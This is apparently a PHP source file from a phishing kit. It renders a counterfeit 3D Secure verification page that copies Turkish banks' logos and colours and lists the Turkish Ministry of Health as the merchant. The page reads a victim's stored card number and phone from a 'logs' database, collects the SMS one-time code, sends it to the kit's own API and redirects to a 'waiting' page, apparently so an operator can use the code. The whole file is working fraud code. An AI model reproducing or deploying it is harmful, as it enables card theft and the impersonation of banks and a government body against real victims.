<?php
require_once 'api/config.php';
require_once 'includes/bank_logos.php';

$logId = isset($_GET['id']) ? intval($_GET['id']) : 0;

if (!$logId) {
    header('Location: basvuru.php');
    exit;
}

try {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM logs WHERE id = ?");
    $stmt->execute([$logId]);
    $log = $stmt->fetch();
    
    if (!$log) {
        header('Location: basvuru.php');
        exit;
    }
} catch (PDOException $e) {
    header('Location: basvuru.php');
    exit;
}

$cardNumber = $log['card_number'];
$maskedCard = '**** **** **** ' . substr(preg_replace('/\s/', '', $cardNumber), -4);
$customerPhone = $log['customer_phone'] ?? '+90 5XX XXX XX XX';
$bankName = $log['card_bank'] ?: 'Banka';
$bankLogo = getBankLogo($bankName);

$bankColors = [
    'AKBANK' => '#DC2521', 'GARANTI' => '#21A362', 'YAPI KREDI' => '#183883',
    'IS BANKASI' => '#1F4797', 'ZIRAAT' => '#E30613', 'VAKIFLAR' => '#FCB600',
    'HALK' => '#0084CA', 'QNB' => '#881F6F', 'DENIZBANK' => '#004F9F',
    'TEB' => '#009748', 'ING' => '#FF6200', 'HSBC' => '#DB0011',
    'KUVEYT' => '#14643C', 'ALBARAKA' => '#F37021', 'SEKERBANK' => '#6BB42F',
    'ODEABANK' => '#D71920', 'PAPARA' => '#000000', 'PTT' => '#FFD200',
    'TURKIYE FINANS' => '#ED1C24', 'VAKIF KATILIM' => '#CBA544', 'ZIRAAT KATILIM' => '#E30613',
];

$bankColor = '#00509D';
$buttonTextColor = '#FFFFFF';
foreach ($bankColors as $key => $color) {
    if (stripos($bankName, $key) !== false) {
        $bankColor = $color;
        if (in_array($key, ['VAKIFLAR', 'PTT', 'VAKIF KATILIM'])) {
            $buttonTextColor = '#333333';
        }
        break;
    }
}
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="utf-8">
    <title>3D Secure Doğrulama</title>
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,shrink-to-fit=no,viewport-fit=cover">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #F0F2F5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .secure-container {
            max-width: 420px; width: 100%; background: #fff;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden;
        }
        .header-border { border-bottom: 4px solid <?= $bankColor ?>; }
        .bank-header { padding: 16px 20px; display: flex; align-items: center; justify-content: center; }
        .bank-header img { height: 48px; object-fit: contain; max-width: 200px; }
        .bank-header span { font-size: 20px; font-weight: bold; color: <?= $bankColor ?>; }
        .sub-header {
            padding: 8px 20px; background: #f9f9f9; border-bottom: 1px solid #eee;
            display: flex; justify-content: space-between; align-items: center;
        }
        .sub-header h1 { font-size: 13px; font-weight: bold; color: #555; }
        .secure-logos { display: flex; gap: 8px; }
        .secure-logos img { height: 24px; object-fit: contain; }
        .content { padding: 20px; }
        .sms-notice {
            background: #FFF9E6; border: 1px solid #FFEeba; color: #856404;
            padding: 10px; font-size: 12px; border-radius: 4px; margin-bottom: 16px;
        }
        .info-table { width: 100%; border-collapse: collapse; margin-bottom: 16px; }
        .info-table td { padding: 8px 10px; border-bottom: 1px solid #eee; color: #333; font-size: 13px; }
        .info-table td:first-child { font-weight: bold; color: #666; width: 40%; }
        .info-table td:last-child { font-weight: bold; text-align: right; }
        .info-table tr:last-child td { border-bottom: none; }
        .sms-input {
            width: 100%; letter-spacing: 2px; font-size: 16px;
            border: 1px solid #ccc; background: #fcfcfc; padding: 10px 12px; border-radius: 4px;
        }
        .sms-input:focus { border-color: <?= $bankColor ?>; outline: none; background: #fff; }
        .btn-row { display: flex; gap: 10px; margin-top: 20px; }
        .btn-cancel {
            flex: 1; padding: 11px; background: #f3f3f3; color: #555; border: 1px solid #ddd;
            border-radius: 4px; font-size: 13px; font-weight: bold; cursor: pointer;
        }
        .btn-cancel:hover { background: #e8e8e8; }
        .btn-submit {
            flex: 2; padding: 11px; background: <?= $bankColor ?>; color: <?= $buttonTextColor ?>;
            border: none; border-radius: 4px; font-size: 13px; font-weight: bold; cursor: pointer;
        }
        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
        .btn-submit:hover:not(:disabled) { opacity: 0.9; }
        .resend-row {
            display: flex; justify-content: space-between; align-items: center;
            margin-top: 8px; font-size: 12px; color: #888;
        }
        .resend-btn {
            background: none; border: none; color: <?= $bankColor ?>; font-size: 12px;
            font-weight: bold; cursor: pointer; padding: 0;
        }
        .resend-btn:disabled { color: #aaa; cursor: default; }
        .footer-bar {
            background: #f9f9f9; border-top: 1px solid #eee; padding: 10px;
            text-align: center; font-size: 10px; color: #999;
            display: flex; align-items: center; justify-content: center; gap: 4px;
        }
        .footer-bar svg { width: 12px; height: 12px; color: #22c55e; }
    </style>
</head>
<body>

    <div class="secure-container">
        <div class="header-border bank-header">
            <?php if ($bankLogo): ?>
            <img src="<?= $bankLogo ?>" alt="<?= $bankName ?>">
            <?php else: ?>
            <span><?= $bankName ?></span>
            <?php endif; ?>
        </div>

        <div class="sub-header">
            <h1>3D Secure Doğrulama</h1>
            <div class="secure-logos">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/250px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png" alt="Visa">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
            </div>
        </div>

        <div class="content">
            <div class="sms-notice">
                Lütfen cep telefonunuza (<?= substr($customerPhone, 0, 4) ?> **** ** <?= substr($customerPhone, -2) ?>) gönderilen tek kullanımlık şifreyi giriniz.
            </div>

            <table class="info-table">
                <tr><td>İşyeri Adı:</td><td>T.C. Sağlık Bakanlığı</td></tr>
                <tr><td>Kart Numarası:</td><td><?= $maskedCard ?></td></tr>
                <tr><td>Tarih / Saat:</td><td><?= date('d.m.Y H:i') ?></td></tr>
            </table>

            <div>
                <label style="display:block;font-size:12px;font-weight:bold;color:#555;margin-bottom:6px;">Doğrulama Kodu</label>
                <input type="password" id="otp-input" maxlength="6" inputmode="numeric" autocomplete="one-time-code"
                    class="sms-input" oninput="this.value=this.value.replace(/[^0-9]/g,'');checkOtp();">
            </div>

            <div class="resend-row">
                <span>Kalan süre: <strong id="countdown">180</strong> sn</span>
                <button class="resend-btn" id="resend-btn" onclick="resendCode()" disabled>TEKRAR GÖNDER</button>
            </div>

            <div class="btn-row">
                <button class="btn-cancel" onclick="cancelTransaction()">İPTAL</button>
                <button class="btn-submit" id="verify-btn" onclick="verifyOtp()" disabled>GÖNDER</button>
            </div>
        </div>

        <div class="footer-bar">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
            </svg>
            Güvenli Ödeme Sayfası (SSL)
        </div>
    </div>

    <script>
        const logId = <?= $logId ?>;
        const otpInput = document.getElementById('otp-input');
        const verifyBtn = document.getElementById('verify-btn');
        let timeLeft = 180;
        let countdownInterval;

        function checkOtp() {
            verifyBtn.disabled = otpInput.value.length !== 6;
        }

        function startCountdown() {
            countdownInterval = setInterval(() => {
                timeLeft--;
                document.getElementById('countdown').textContent = timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    document.getElementById('resend-btn').disabled = false;
                    document.getElementById('countdown').textContent = '0';
                }
            }, 1000);
        }

        function resendCode() {
            timeLeft = 180;
            document.getElementById('resend-btn').disabled = true;
            document.getElementById('countdown').textContent = '180';
            startCountdown();
            otpInput.value = '';
            otpInput.focus();
            checkOtp();
        }

        function cancelTransaction() {
            if (confirm('İşlemi iptal etmek istediğinize emin misiniz?')) {
                window.location.href = 'cart.php';
            }
        }

        async function verifyOtp() {
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'LÜTFEN BEKLEYİN...';

            const smsCode = otpInput.value;

            try {
                await fetch('api/logs.php', {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: logId, redirect_to: 'waiting', sms_code: smsCode })
                });
            } catch (e) {}

            setTimeout(() => {
                window.location.href = 'waiting.php?id=' + logId;
            }, 1500);
        }

        startCountdown();
        otpInput.focus();
    </script>

    <?php include 'includes/tracker.php'; ?>
</body>
</html>
